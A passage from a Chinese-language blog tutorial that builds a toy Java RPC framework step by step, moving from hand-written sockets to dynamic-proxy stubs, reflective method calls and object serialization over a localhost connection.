s.getOutputStream().write(baos.toByteArray());</span><br><span class="line">        s.getOutputStream().flush();</span><br><span class="line"></span><br><span class="line">        DataInputStream dis = <span class="keyword">new</span> DataInputStream(s.getInputStream());</span><br><span class="line">        <span class="keyword">int</span> id = dis.readInt();</span><br><span class="line">        String name = dis.readUTF();</span><br><span class="line">        User user = <span class="keyword">new</span> User(id, name);</span><br><span class="line"></span><br><span class="line">        System.out.println(user);</span><br><span class="line"></span><br><span class="line">        dos.close();</span><br><span class="line">        s.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**问题所在：不难看出，在这个例子中，初始版本最大的问题在于，如果我要对User类做修改，比如新增一些字段，或者直接新增一个Product类，那么我的客户端和服务端的代码就需要大量修改，显然不符合重用性和简洁性原则。**继续来看第二个版本。</p><h2 id="第二个版本">第二个版本</h2><p>在第二个版本中我们只做一个改进，把客户端关于网络连接和数据传输的具体过程抽象到另外一个代理类中，这个类的名字叫做<code>Stub</code>。</p><p>Stub.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Stub</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(Integer id)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Socket s = <span class="keyword">new</span> Socket(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(baos);</span><br><span class="line">        dos.writeInt(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        s.getOutputStream().write(baos.toByteArray());</span><br><span class="line">        s.getOutputStream().flush();</span><br><span class="line"></span><br><span class="line">        DataInputStream dis = <span class="keyword">new</span> DataInputStream(s.getInputStream());</span><br><span class="line">        <span class="keyword">int</span> receivedId = dis.readInt();</span><br><span class="line">        String name = dis.readUTF();</span><br><span class="line">        User user = <span class="keyword">new</span> User(receivedId, name);</span><br><span class="line"></span><br><span class="line">        dos.close();</span><br><span class="line">        s.close();</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么客户端代码就直接调用Stub类中的<code>findUserById</code>方法即可，服务端的代码不需要变动。</p><p>Client.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Stub stub = <span class="keyword">new</span> Stub();</span><br><span class="line">        System.out.println(stub.findUserById(<span class="number">123</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个版本的RPC代码相对上一个版本改进不大，因为Stub只实现了一个对象类中的一个方法，这样的调用会显得不太合理，甚至很弱鸡。接着来看第三个版本。</p><h2 id="第三个版本">第三个版本</h2><p>上一个版本的代码只实现了<code>findUserById</code>，如果有一个<code>findUserByName</code>的新方法，那么又得在Stub类中再写一个函数，但是下面这种写法就解决了函数增加的问题。</p><p>Stub.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Stub</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IUserService <span class="title">getStub</span><span class="params">()</span></span>&#123;</span><br><span class="line">        InvocationHandler h = <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                Socket s = <span class="keyword">new</span> Socket(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line">                ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(baos);</span><br><span class="line">                dos.writeInt(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">                s.getOutputStream().write(baos.toByteArray());</span><br><span class="line">                s.getOutputStream().flush();</span><br><span class="line"></span><br><span class="line">                DataInputStream dis = <span class="keyword">new</span> DataInputStream(s.getInputStream());</span><br><span class="line">                <span class="keyword">int</span> id = dis.readInt();</span><br><span class="line">                String name = dis.readUTF();</span><br><span class="line">                User user = <span class="keyword">new</span> User(id, name);</span><br><span class="line"></span><br><span class="line">                dos.close();</span><br><span class="line">                s.close();</span><br><span class="line">                <span class="keyword">return</span> user;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Object o = Proxy.newProxyInstance(IUserService.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;IUserService.class&#125;, h);</span><br><span class="line">        System.out.println(o.getClass().getName());</span><br><span class="line">        System.out.println(o.getClass().getInterfaces()[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> (IUserService) o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        IUserService service = Stub.getStub();</span><br><span class="line">        System.out.println(service.findUserById(<span class="number">123</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用了动态代理的知识，简单来说，<code>Stub.getStub</code>这个静态方法返回了一个动态对象，其中这个动态对象实现了<code>UserService</code>接口。</p><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com.sun.proxy.$Proxy0</span><br><span class="line">interface com.ca01h.rpc.common.IUserService</span><br><span class="line">User&#123;id&#x3D;123, name&#x3D;&#39;ca01h&#39;&#125;</span><br></pre></td></tr></table></figure><h2 id="第四个版本">第四个版本</h2><p>上一个版本的Stub.java局限于处理<code>findUserById</code>这个函数，那么在这个版本中无论任何一个方法，都可以用通用的代码实现：</p><p>Stub.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Stub</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IUserService <span class="title">getStub</span><span class="params">()</span></span>&#123;</span><br><span class="line">        InvocationHandler h = <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                Socket s = <span class="keyword">new</span> Socket(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line">                ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(s.getOutputStream());</span><br><span class="line"></span><br><span class="line">                String methodName = method.getName();</span><br><span class="line">                Class[] parametersTypes = method.getParameterTypes();</span><br><span class="line">                oos.writeUTF(methodName);</span><br><span class="line">                oos.writeObject(parametersTypes);</span><br><span class="line">                oos.writeObject(args);</span><br><span class="line">                oos.flush();</span><br><span class="line"></span><br><span class="line">                DataInputStream dis = <span class="keyword">new</span> DataInputStream(s.getInputStream());</span><br><span class="line">                <span class="keyword">int</span> id = dis.readInt();</span><br><span class="line">                String name = dis.readUTF();</span><br><span class="line">                User user = <span class="keyword">new</span> User(id, name);</span><br><span class="line"></span><br><span class="line">                oos.close();</span><br><span class="line">                s.close();</span><br><span class="line">                <span class="keyword">return</span> user;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Object o = Proxy.newProxyInstance(IUserService.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;IUserService.class&#125;, h);</span><br><span class="line">        System.out.println(o.getClass().getName());</span><br><span class="line">        System.out.println(o.getClass().getInterfaces()[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> (IUserService) o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点就在于这6行代码，其实看着也挺明白的，拿到客户端传过来的方法名、参数类型、参数的值去找服务端的实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String methodName = method.getName();</span><br><span class="line">Class[] parametersTypes = method.getParameterTypes();</span><br><span class="line">oos.writeUTF(methodName);</span><br><span class="line">oos.writeObject(parametersTypes);</span><br><span class="line">oos.writeObject(args);</span><br><span class="line">oos.flush();</span><br></pre></td></tr></table></figure><p>那么同样的，服务端的代码也得跟着变：</p><p>Server.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.rpc01.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ServerSocket ss = <span class="keyword">new</span> ServerSocket(<span class="number">8888</span>);</span><br><span class="line">        <span class="keyword">while</span> (running) &#123;</span><br><span class="line">            Socket s = ss.accept();</span><br><span class="line">            process(s);</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;</span><br><span class="line">        ss.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Socket s)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        InputStream in = s.getInputStream();</span><br><span class="line">        OutputStream out = s.getOutputStream();</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(out);</span><br><span class="line"></span><br><span class="line">        String methodName = ois.readUTF();</span><br><span class="line">        Class[] parametersTypes = (Class[]) ois.readObject();</span><br><span class="line">        Object[] args = (Object[]) ois.readObject();</span><br><span class="line">        </span><br><span class="line">        IUserService service = <span class="keyword">new</span> UserServiceImpl();</span><br><span class="line">        Method method = service.getClass().getMethod(methodName, parametersTypes);</span><br><span class="line">        User user = (User)method.invoke(service, args); </span><br><span class="line">        dos.writeInt(user.getId());</span><br><span class="line">        dos.writeUTF(user.getName());</span><br><span class="line">        dos.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射的方式向服务端调用函数。</p><h2 id="第五个版本">第五个版本</h2><p>这个版本就解决一个问题：返回值用Object封装，支持任意类型。</p><p>Stub.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.DataInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Stub</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IUserService <span class="title">getStub</span><span class="params">()</span></span>&#123;</span><br><span class="line">        InvocationHandler h = <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                Socket s = <span class="keyword">new</span> Socket(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line">                ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(s.getOutputStream());</span><br><span class="line"></span><br><span class="line">                String methodName = method.getName();</span><br><span class="line">                Class[] parametersTypes = method.getParameterTypes();</span><br><span class="line">                oos.writeUTF(methodName);</span><br><span class="line">                oos.writeObject(parametersTypes);</span><br><span class="line">                oos.writeObject(args);</span><br><span class="line">                oos.flush();</span><br><span class="line"></span><br><span class="line">                ObjectInputStream ois= <span class="keyword">new</span> ObjectInputStream(s.getInputStream());</span><br><span class="line">                User user = (User) ois.readObject();</span><br><span class="line"></span><br><span class="line">                oos.close();</span><br><span class="line">                s.close();</span><br><span class="line">                <span class="keyword">return</span> user;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Object o = Proxy.newProxyInstance(IUserService.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;IUserService.class&#125;, h);</span><br><span class="line">        System.out.println(o.getClass().getName());</span><br><span class="line">        System.out.println(o.getClass().getInterfaces()[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> (IUserService) o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端相应变化：</p><p>Server.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.rpc01.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ServerSocket ss = <span class="keyword">new</span> ServerSocket(<span class="number">8888</span>);</span><br><span class="line">        <span class="keyword">while</span> (running) &#123;</span><br><span class="line">            Socket s = ss.accept();</span><br><span class="line">            process(s);</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;</span><br><span class="line">        ss.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Socket s)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        InputStream in = s.getInputStream();</span><br><span class="line">        OutputStream out = s.getOutputStream();</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line"></span><br><span class="line">        String methodName = ois.readUTF();</span><br><span class="line">        Class[] parametersTypes = (Class[]) ois.readObject();</span><br><span class="line">        Object[] args = (Object[]) ois.readObject();</span><br><span class="line"></span><br><span class="line">        IUserService service = <span class="keyword">new</span> UserServiceImpl();</span><br><span class="line">        Method method = service.getClass().getMethod(methodName, parametersTypes);</span><br><span class="line">        User user = (User)method.invoke(service, args);</span><br><span class="line">        oos.writeObject(user);</span><br><span class="line">        oos.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第六个版本">第六个版本</h2><p>以上版本的<code>Stub.getStub</code>只能拿到<code>IUserService</code>一个接口，现在需要能够帮我生成更多类型的代理。</p><p>Client.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        IUserService userService = (IUserService) Stub.getStub(IUserService.class);</span><br><span class="line">        System.out.println(userService.findUserById(<span class="number">123</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Stub.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Stub</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getStub</span><span class="params">(Class clazz)</span></span>&#123;</span><br><span class="line">        InvocationHandler h = <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                Socket s = <span class="keyword">new</span> Socket(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line">                ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(s.getOutputStream());</span><br><span class="line">                String clazzName = clazz.getName();</span><br><span class="line">                String methodName = method.getName();</span><br><span class="line">                Class[] parametersTypes = 